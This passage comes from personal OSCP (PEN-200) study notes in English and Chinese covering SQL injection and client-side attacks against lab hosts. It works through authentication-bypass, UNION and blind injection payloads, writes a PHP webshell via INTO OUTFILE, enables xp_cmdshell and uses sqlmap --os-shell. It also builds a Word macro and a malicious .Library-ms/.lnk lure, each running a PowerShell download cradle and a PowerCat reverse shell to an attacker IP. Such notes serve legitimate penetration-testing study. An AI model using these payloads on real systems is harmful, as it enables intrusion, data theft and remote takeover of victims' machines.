$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>         
```
> Both the `uname` and `password` parameters come from user-supplied input. (可控)

uname= `offsec' OR 1=1 -- //`
```
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
```
1. Append a single quote to the username\
![image](https://hackmd.io/_uploads/B1NEBE4Q1l.png)
    > SQL syntax error this time, meaning we can interact with the database.

    ```
    offsec' OR 1=1 -- //
    ```
    ![image](https://hackmd.io/_uploads/Bknx844Xkl.png)
    > received an Authentication Successful message, meaning that our attack succeeded

2. Check DB version
    ```
    ' or 1=1 in (select @@version) -- //
    ```          
    ![image](https://hackmd.io/_uploads/ryxGc4VQkg.png)
    > This means that we should **only query one column at a time**.

3. Grab only the password column
    ```
    ' or 1=1 in (SELECT password FROM users) -- //
    ```
    ![image](https://hackmd.io/_uploads/BJb_q4VXJe.png)
    > 1. retrieve all user password hashes
    > 2. But don't know which user each password hash corresponds to
    > 3. solve the issue by adding a WHERE clause
4. WHERE clause
    ```
    ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
    ```
    ![image](https://hackmd.io/_uploads/HJm_2EE7kl.png)

#### - UNION-based Payloads
The UNION keyword aids exploitation because it enables the execution of an `extra SELECT statement and provides the results in the same query`.
>[!Warning]
> 1. The injected UNION query has to include the same number of columns as the original query.
> 2. The data types need to be compatible between each column.

Vulnerable SQL Query
```php
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```
![image](https://hackmd.io/_uploads/HJgV5gU4Xye.png)
> click SEARCH to retrieve all data from the customers table

>[!Note]
we need to know the exact number of columns present in the target table.

1. Verifying the exact number of columns
```
' ORDER BY 1-- //
' ORDER BY 2-- //
...
' ORDER BY 6-- //
```
![image](https://hackmd.io/_uploads/H1_QWUVmye.png)
> we'll discover that the table has `five columns` since ordering by **column six returns an error**. 
            
2. Attempt our first attack            
```
%' UNION SELECT database(), user(), @@version, null, null -- //
```
> (1) %' 來閉合 search parameter\
> (2) 配合 UNION SELECT\
> (3) dumps the current database name, the user, and the MySQL version in the first, second, and third columns, respectively, leaving the remaining two null.
            
![image](https://hackmd.io/_uploads/ryMzXUEmyx.png)
> `username` and the `DB version` are present on the last line, but the current database name is not.\
> `column 1` is typically reserved for the `ID field` consisting of an integer data type, **cannot return the string value**.
>> So... shifting all the enumerating functions
            
```
' UNION SELECT null, null, database(), user(), @@version  -- //
```
![image](https://hackmd.io/_uploads/BybRILV7Je.png)

3. Verify whether other tables are present in the current database
retrieve the columns table from the `information_schema database` belonging to the current database
```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```
![image](https://hackmd.io/_uploads/SkinoLNXJl.png)
> the three columns contain the `table name`, the `column name`, and the `current database`, respectively
>> Also... new table named **"users"** that contains four columns, including one named password.

```
' UNION SELECT null, username, password, description, null FROM users -- //
```
![image](https://hackmd.io/_uploads/SkugTUV7ke.png)
> fetch the usernames and **MD5 hashes** of the entire users table

>[!Important]
> `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`

#### - Blind SQL Injections
database responses are never returned and behavior is inferred using either boolean- or time-based logic            
            
![image](https://hackmd.io/_uploads/HkXdOvNQyl.png)
> the application takes a user parameter as input
            
```
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```           
> enumerate the entire database for other usernames or even extend our SQL query to verify data in other tables

```
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
> the application hangs for about three seconds.
            
### Manual and Automated Code Execution
#### - Manual Code Execution
- MSSQL
>[!Caution]
the **`xp_cmdshell`** function takes a string and passes it to a command shell for execution.\
The function returns **any output as rows of text**.\
be called with the `EXECUTE` keyword instead of `SELECT`.
default: disable
 
`xp_cmdshell` feature: ([MSSQL:sp_configure](https://learn.microsoft.com/zh-tw/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver16))
```
┌──(chw㉿CHW-kali)-[/]
└─$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
```
> 1. `EXECUTE sp_configure 'show advanced options', 1;`: 開啟 advanced options，可以顯示進階組態選項。
> 2. `RECONFIGURE`: 將以上變更生效
> 3. `EXECUTE sp_configure 'xp_cmdshell', 1;`: 啟用 xp_cmdshell (可執行系統層級的命令)

Executing Commands via xp_cmdshell:
```
SQL (SQLPLAYGROUND\Administrator  dbo@master)> EXECUTE xp_cmdshell 'whoami';
output
---------------------------
nt service\mssql$sqlexpress

NULL
```            
- MySQL
>[!Caution]
> various MySQL database variants don't offer a single function to escalate to RCE, we can abuse the `SELECT INTO_OUTFILE` statement to write files on the web server.

UNION payload: writes a webshell
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
> Write a WebShell To Disk via INTO OUTFILE directive

>[!Important]
> PHP reverse shell: `<? system($_REQUEST['cmd']); ?>`

#### - Automating the Attack (sqlmap)
>[!Note]
> Due to its high volume of traffic, sqlmap should not be used as a first choice tool during assignments that require staying under the radar.
```
┌──(chw㉿CHW-kali)-[/]
└─$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

...
[*] starting @ 02:14:54 PM /2022-05-16/

...
---
Parameter: user (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=1' AND (SELECT 1582 FROM (SELECT(SLEEP(5)))dTzB) AND 'hiPB'='hiPB
---
[14:14:57] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP, PHP 7.3.33, Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12
...
```
> `-p`: 要測試的參數

Another sqlmap core feature is the `--os-shell` parameter: **full interactive shell**.
![image](https://hackmd.io/_uploads/r1qN4AtQJg.png)
```
┌──(chw㉿CHW-kali)-[/]
└─$ sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
...
[*] starting @ 02:20:47 PM /2022-05-19/

[14:20:47] [INFO] parsing HTTP request from 'post'
[14:20:47] [INFO] resuming back-end DBMS 'mysql'
[14:20:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: item (POST)
...
---
...
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
[14:20:49] [INFO] using '/var/www/html/tmp' as web server document root
 ...
[14:20:51] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> id
do you want to retrieve the command standard output? [Y/n/a] y
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'

os-shell> pwd
do you want to retrieve the command standard output? [Y/n/a] y
command standard output: '/var/www/html/tmp'
```

## Client-side Attacks
>[!Tip]
> Phishing: persuade, trick, or deceive the target user\
> **the opportunity to contemplate the vulnerabilities, biases and fragility inherent to people**\
> `human psychology`, `corporate culture`, `social norms`, `moral aspect`

>[!Note]
> Since the client's machine in an internal enterprise network is not usually a directly-accessible system, and since it does not often offer externally-exposed services
>> `USB Dropping` or `watering hole attacks`

- Target Reconnaissance
### - exiftool: metadata tag
download file to display the metadata tag
```
exiftool -a -u {file}
```
`-a` 顯示 duplicated tags\
`-u` 顯示 unknown tags
### - theHarvester: OSINT tool
```
options:
  -h, --help            show this help message and exit
  -d, --domain DOMAIN   Company name or domain to search.
  -l, --limit LIMIT     Limit the number of search results, default=500.
  -S, --start START     Start with result number X, default=0.
  -p, --proxies         Use proxies for requests, enter proxies in proxies.yaml.
  -s, --shodan          Use Shodan to query discovered hosts.
  --screenshot SCREENSHOT
                        Take screenshots of resolved domains specify output directory: --screenshot output_directory
  -v, --virtual-host    Verify host name via DNS resolution and search for virtual hosts.
  -e, --dns-server DNS_SERVER
                        DNS server to use for lookup.
  -t, --take-over       Check for takeovers.
  -r, --dns-resolve [DNS_RESOLVE]
                        Perform DNS resolution on subdomains with a resolver list or passed in resolvers, default False.
  -n, --dns-lookup      Enable DNS server lookup, default False.
  -c, --dns-brute       Perform a DNS brute force on the domain.
  -f, --filename FILENAME
                        Save the results to an XML and JSON file.
  -b, --source SOURCE   anubis, baidu, bevigil, binaryedge, bing, bingapi, bufferoverun, brave, censys, certspotter, criminalip, crtsh, dnsdumpster,
                        duckduckgo, fullhunt, github-code, hackertarget, hunter, hunterhow, intelx, netlas, onyphe, otx, pentesttools, projectdiscovery,
                        rapiddns, rocketreach, securityTrails, sitedossier, subdomaincenter, subdomainfinderc99, threatminer, tomba, urlscan, virustotal,
                        yahoo, zoomeye

┌──(chw㉿CHW-kali)-[/]
└─$ python3 theHarvester.py -d google.com -b baidu
```
![image](https://hackmd.io/_uploads/BJes2sIEJx.png)

### - HTML Application (HTA)
基於 HTML 和 Script（如 JavaScript 或 VBScript）構建的執行檔案格式
>[!Tip]
> 攻擊思維： \
> [Introduction to HTML Applications (HTAs)](https://learn.microsoft.com/en-us/previous-versions//ms536496(v=vs.85)?redirectedfrom=MSDN)
> 附加 <HTA:APPLICATION> 在 email 中
>> `.hta`有高權限，可以透過訪問系統權限執行 Windows 腳本。
            
### - [Canarytokens](https://canarytokens.com/nest/)
用於檢測使用者是否有未經授權的訪問或攻擊行為，可以偽裝成 API 金鑰、文件、URL等等\
結合社交工程或嵌入 web application 中，取得使用者資訊。
When the target opens the link in a browser, we will get information about their browser, IP address, and operating system.
![image](https://hackmd.io/_uploads/S1XSbR8Nyl.png)

### - Exploiting Microsoft Office (Macro)
malicious macro attacks\
Word 和 Excel 等 Microsoft Office 可以讓使用者嵌入巨集
>[!Note]
> **Mark of the Web (MOTW)**:\
> Windows 系統會針對網絡下載的文件，自動檢查並標註 tag。為了避免下載後直接被執行或開啟。
            
Possibility to execute Macros by clicking one Button\
![image](https://hackmd.io/_uploads/r1G-dCLVJg.png)

Changed message after opening the document\
![image](https://hackmd.io/_uploads/BkQz_08Ekg.png)

>[!Important]
> `Macros` can be written from scratch in `Visual Basic for Applications (VBA)`, which is a powerful scripting language with full access to `ActiveX objects` and the `Windows Script Host`, similar to JavaScript in HTML Applications.
>> `Visual Basic for Applications (VBA)`: VBA 是一種由微軟開發的程式語言，主要用於自動化和擴展 Microsoft Office （如 Word、Excel、PowerPoint）的功能。 \
>> `ActiveX objects`: 微軟推出的技術，允許在應用程式中嵌入程式碼。創建可嵌入的控件（如按鈕、圖形、文件瀏覽器等)\
>> `Windows Script Host`: 微軟提供的 Windows 的腳本環境，允許執行用於自動化操作的腳本。如 JavaScript、VBScript 等。

#### macro in Microsoft Word to launch a reverse shell
`Macros` are one of the oldest and best-known client-side attack vectors.\
(1) 建立一個空白 Word 檔\
(2) 儲存為 `.doc` (`.docx`可以執行 macro，但不能嵌入儲存)\
(3) 創建 macro ( Word > View > Macros)\
(4) Macro Name ＆ Macros in: mymacro(document)\
    ![image](https://hackmd.io/_uploads/SyrHqSKVJl.png)\
(5) 顯示 Microsoft Visual Basic 的 Applications window，可以開始編輯 macro\
![image](https://hackmd.io/_uploads/r1B39rY4ye.png)\
(6) 透過 Windows Script Host Shell 撰寫 WScript 執行\
範例： 開啟 PowerShell 視窗
```WScript
Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```
>[!Caution]
> Office 巨集不會自動執行，所以需要定義 AutoOpen macro 和 Document_Open event
            
(7) Renew VBA code
```WScript
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```
(8) 儲存後重開檔案。 security warning 選擇 Enable Content。\
(9) 成功跳出 PowerShell 視窗

#### execution of current macro to a reverse shell: PowerCat
(1) 透過 [cradle](https://gist.github.com/HarmJ0y/bb48307ffa663256e239) 下載 PowerCat\
(2) 寫入 reverse shell
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```
(3) base64-encoded PowerShell commands (declared as a String in VBA.)
>[!Warning]
> VBA 的字串長度限制 255-character，所以不能單純將 base64-encoded PowerShell commands 存入單一字串。\
>可以透過 multiple lines 再串接起來

以下分割字串用 python 完成:
```python=
#str 為分割前的指令
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

#for 迴圈輸出符合巨集的格式
for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

(4) 回到 Macro 編輯視窗，透過 `Dim` 宣告 `Str`變數，並且將 PowerShell download 儲存在 `Str`中
```WScript
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str
End Sub
```

(5) 加入經過 python 分割的字串
```WScript
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```
> 編輯完後，儲存重開檔案

>[!Tip]
> 重啟 Word 時，不再顯示 security warning\
> (除非更改檔名才需要再次確認 Enable Content )

(6) 在 PowerCat 目錄下啟動 Python3 Web Server, 同時開啟 Netcat listening port
```
┌──(chw㉿CHW-kali)-[/]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.196] 49768
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\offsec\Documents>
```

### - Obtaining Code Execution via Windows Library Files (Webdav & .link)
Windows library files are virtual containers for user content. They connect users with data stored in remote locations like web services or shares
#### 1. Windows library files to gain a foothold on the target system
##### - (1) 建立 [WebDAV](https://zh.wikipedia.org/zh-tw/WebDAV) 連接共享 Windows library
  >[!Note]
  > `WebDAV` (Web Distributed Authoring and Versioning)\
  > 基於 HTTP 協議的擴展，允許 user 遠端上傳、下載、刪除和編輯伺服器上的文件
            
(1-1) use [WsgiDAV2](https://wsgidav.readthedocs.io/en/latest/index.html) as the WebDAV server to host and serve our files

```
┌──(chw㉿CHW-kali)-[~]
└─$ pip3 install wsgidav        
Defaulting to user installation because normal site-packages is not writeable
Collecting wsgidav
  Downloading WsgiDAV-4.3.3-py3-none-any.whl.metadata (7.0 kB)
Requirement already satisfied: defusedxml in /usr/lib/python3/dist-packages (from wsgidav) (0.7.1)
Requirement already satisfied: Jinja2 in /usr/lib/python3/dist-packages (from wsgidav) (3.1.3)
Collecting json5 (from wsgidav)
  Downloading json5-0.10.0-py3-none-any.whl.metadata (34 kB)
Requirement already satisfied: PyYAML in /usr/lib/python3/dist-packages (from wsgidav) (6.0.1)
Downloading WsgiDAV-4.3.3-py3-none-any.whl (164 kB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 165.0/165.0 kB 578.7 kB/s eta 0:00:00
Downloading json5-0.10.0-py3-none-any.whl (34 kB)
Installing collected packages: json5, wsgidav
  WARNING: The script pyjson5 is installed in '/home/chw/.local/bin' which is not on PATH.
  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.
  WARNING: The script wsgidav is installed in '/home/chw/.local/bin' which is not on PATH.
  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.                                                                                                         
Successfully installed json5-0.10.0 wsgidav-4.3.3
```
(1-2) 建立`/home/kali/webdav` 包含`.lnk` 檔案的 WebDAV 路徑 。然後在此目錄中放置一個 test.txt 
```
┌──(chw㉿CHW-kali)-[~]
└─$ mkdir /home/kali/webdav

┌──(chw㉿CHW-kali)-[~]
└─$ touch /home/kali/webdav/test.txt         
```
(1-3) 啟動 WebDAV 伺服器
```
┌──(chw㉿CHW-kali)-[~]
└─$ /home/chw/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/chw/webdav/
Running without configuration file.
15:47:54.307 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
15:47:54.308 - INFO    : WsgiDAV/4.3.3 Python/3.11.9 Linux-6.8.11-arm64-aarch64-with-glibc2.38
15:47:54.308 - INFO    : Lock manager:      LockManager(LockStorageDict)
15:47:54.308 - INFO    : Property manager:  None
15:47:54.308 - INFO    : Domain controller: SimpleDomainController()
15:47:54.308 - INFO    : Registered DAV providers by route:
15:47:54.308 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/chw/.local/lib/python3.11/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
15:47:54.308 - INFO    :   - '/': FilesystemProvider for path '/home/chw/webdav' (Read-Write) (anonymous)
15:47:54.308 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
15:47:54.308 - WARNING : Share '/' will allow anonymous write access.
15:47:54.308 - WARNING : Share '/:dir_browser' will allow anonymous write access.
15:47:54.336 - INFO    : Running WsgiDAV/4.3.3 Cheroot/10.0.0 Python/3.11.9
15:47:54.336 - INFO    : Serving on http://0.0.0.0:80 ...
            
```
> 1. 從 `/home/chw/.local/bin/wsgidav` 目錄執行 WsgiDAV
> 2. `--host=0.0.0.0`: 伺服器會綁定在所有網路端口上，允許來自任何 IP 地址的連線
> 3. specify the listening port with `--port=80`
> 4. `--auth=anonymous`: 使用匿名驗證，不需要用戶名或密碼即可訪問
> 5. 指定 WebDAV 伺服器的根目錄為 `/home/chw/webdav/` (剛剛創建的惡意路徑)

![image](https://hackmd.io/_uploads/B1yHPq8r1l.png)

(1-3) 在 window RDP 創建 config.Library-ms
![image](https://hackmd.io/_uploads/H1DJxjUr1l.png)
> Save the file with this file extension

(1-4) 創建 file extension 的 XML
>[!Note]
> Library files consist of three major parts (`General library information`, `Library properties` & `Library locations`)and are written in XML to specify the parameters for accessing remote locations.\
> [Library Description Schema](https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry)

- 定義 XML 文件基本資訊
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">

</libraryDescription>
```
> 使用了屬於 Windows Library 的 library file format http://schemas.microsoft.com/windows/2009/library
- Library 的基本資訊
```xml
<name>@windows.storage.dll,-34582</name>
<version>6</version>
```
> XML and Library Description Version\
> `windows.storage.dll,-34582`: 表示一個系統定義的名稱，會被解析為「文件」的名稱。
- 設定 library 的其他屬性
`isLibraryPinned`:  設定此 Library 是否要固定在 Windows Explorer 的側邊導航欄中，設為 true 表示會固定\
`iconReference`: what icon is used to display the library file.
```xml
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
```
> Configuration for Navigation Bar Pinning and Icon\
> `imageres.dll,-1003`: 指定一個系統內建的「圖片」資料夾 icon

- 設定 folderType 與顯示 templateInfo tags
```xml
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
```
> `templateInfo`：指定檔案總管打開 Library 時會使用的顯示模板\
>`folderType`：指定 GUID（唯一識別碼）對應的資料夾類型\
>例如：{7d49d726-3c21-4f05-99aa-fdc2c9474656} 表示「文件」類型，預設會顯示文件相關的列，例如名稱、日期等。            

- 指定 Library 的位置

```xml
<searchConnectorDescriptionList>
    <searchConnectorDescription>
        <isDefaultSaveLocation>true</isDefaultSaveLocation>
        <isSupported>false</isSupported>
        <simpleLocation>
            <url>http://192.168.119.2</url>
        </simpleLocation>
    </searchConnectorDescription>
</searchConnectorDescriptionList>
```
> `searchConnectorDescriptionList`：列出此 Library 中的所有 searchConnector
>> `searchConnectorDescription`：設定單個連接器的細節\
>> `isDefaultSaveLocation`：指定是否將此位置作為預設的儲存位置，設為 true 表示啟用\
>> `isSupported`：不在官方文檔中，但可以設定為 false，通常用於兼容性處理\
>> `<simpleLocation>` 和 `<url>`：指定遠端資源的位置。在這裡，http://192.168.218.129 是目標的 WebDAV 伺服器 URL。

            
```xml=
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@windows.storage.dll,-34582</name>
    <version>6</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1003</iconReference>
    <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <isSupported>false</isSupported>
            <simpleLocation>
                <url>http://192.168.218.129</url>
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
```
![image](https://hackmd.io/_uploads/H1gbw0qByg.png)
> 以上可以用於自動化連接遠端資源，並在系統中偽裝成看似正常的資料夾

##### - (2) victim 接收開啟 `.Library-ms` file
  >[!Note]
  > `.Library-ms` file\
  > .Library-ms 是 Windows 函式庫的文件格式，用於將多個資料夾整合成虛擬目錄
  >> 以下要透過 自訂義的`.Library-ms`，指向遠端 WebDAV 共享目錄，讓 victim 存取目錄。

![image](https://hackmd.io/_uploads/BJgf509HJg.png)
> 成功遠端存取 WebDAV share\
> The path in the navigation bar only `shows config without any indication` that this is actually a remote location. This makes it a perfect first stage for our client-side attack.

重新打開 `.library-ms` 文件後，發現 XML 中出現了新的 serialized 標籤，並且 url 的值由 http://192.168.218.129 變為 \\192.168.218.129\DavWWWRoot。\
• 原因：Windows 自動優化 WebDAV 連接，對應其內建的 WebDAV 客戶端。\
• 問題：變更內容可能導致文件在其他機器或重啟後無法正常運作，最終讓攻擊失敗。

>[!Important]
> The goal is to start a reverse shell by putting the `.lnk` shortcut file on the WebDAV share for the victim to execute

(2-1) 在桌面上建立新的 .link
(桌面點擊右鍵: Create Shortcut)
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1'); powercat -c 192.168.119.3 -p 4444 -e powershell"
```
> Download Cradle and PowerCat Reverse Shell Execution\
> 與前面使用的 Ｗindows reverse shell 方法相同

![image](https://hackmd.io/_uploads/rJjKl1jSkg.png)
> In the next window, let's enter **automatic_configuration** as the name for the shortcut file and click Finish to create the file.
##### - (3) 將 payload 塞入 `.lnk` shortcut，victim 點擊觸發 PowerShell reverse shell

>[!Important]
> 缺點： **需要提供 web link（via E-mail**）\
> 會導致在送到 victim 前，已經被 Mail spam filters 過濾掉

```
┌──(chw㉿CHW-kali)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.194] 49768
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0>
```

#### 2. use the foothold to provide an executable file
Let's copy `automatic_configuration.lnk` and `config.Library-ms` to our WebDAV directory on our Kali machine.
- send the library file via email 
- use the \\192.168.50.195\share SMB share to simulate the delivery step

```
┌──(chw㉿CHW-kali)-[~]
└─$ cd webdav

┌──(chw㉿CHW-kali)-[~/webdav]
└─$ rm test.txt

┌──(chw㉿CHW-kali)-[~/webdav]
└─$ smbclient //192.168.50.195/share -c 'put config.Library-ms'
Password for [WORKGROUP\chw]:
putting file config.Library-ms as \config.Library-ms (1.8 kb/s) (average 1.8 kb/s)

```
            
```
┌──(chw㉿CHW-kali)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.195] 56839
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
hr137\hsmith
```

>[!Caution]
> HackMD 筆記長度限制，接續 [OSCP: Self Note - Part 2](https://chw41.github.io/b1og/oscp-pen-200-instructional-notes---part-2/)
    
# [Link to: "[OSCP, PEN-200] Instructional notes - Part 2"](https://chw41.github.io/b1og/oscp-pen-200-instructional-notes---part-2/)

# [Link to: "[OSCP, PEN-200] Instructional notes - Part 3"](https://chw41.github.io/b1og/oscp-pen-200-instructional-notes---part-3/)
            
# [Link to: "[OSCP, PEN-200] Instructional notes - Part 4"](https://chw41.github.io/b1og/oscp-pen-200-instructional-notes---part-4/)

# [Link to: "[OSCP, PEN-200] Instructional notes - Part 5"](https://chw41.github.io/b1og/oscp-pen-200-instructional-notes---part-5/)
            
# [Link to: "[OSCP, PEN-200] Instructional notes - Part 6"](https://chw41.github.io/b1og/oscp-pen-200-instructional-notes---part-6/)
            
# [Link to: "[OSCP, PEN-200] Instructional notes - Part 7"](https://chw41.github.io/b1og/oscp-pen-200-instructional-notes---part-7/)

# [Link to: "[OSCP, PEN-200] Instructional notes - Part 8"](https://chw41.github.io/b1og/oscp-pen-200-instructional-notes---part-8/)

##### tags: `offsec` `oscp` `oscp+` `web security` `pentesting` `red team`
